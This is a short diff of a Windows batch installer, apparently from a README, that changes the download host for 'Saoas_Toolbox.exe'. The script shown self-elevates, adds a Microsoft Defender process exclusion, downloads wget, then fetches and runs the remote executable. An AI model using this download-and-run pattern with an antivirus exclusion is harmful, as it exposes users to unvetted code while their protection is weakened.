@@ -23,7 +23,7 @@ cscript //nologo "%~f0?.wsf" //job:Elevate & exit /b
 powershell -Command Add-MpPreference -ExclusionProcess "Saoas_Toolbox.exe" -Force
 cd /d "%USERPROFILE%/Desktop/"
 powershell Invoke-WebRequest -Uri "https://eternallybored.org/misc/wget/1.21.4/64/wget.exe" -OutFile "wget.exe" 
-wget -q --show-progress --user-agent="chrome" --no-hsts "https://links.saoas.tv/Toolbox/Saoas_Toolbox.exe" -O Saoas_Toolbox.exe
+wget -q --show-progress --user-agent="chrome" --no-hsts "https://files.saoas.tv/Toolbox/Saoas_Toolbox.exe" -O Saoas_Toolbox.exe
 del /f wget.exe 
 Saoas_Toolbox.exe
 ```
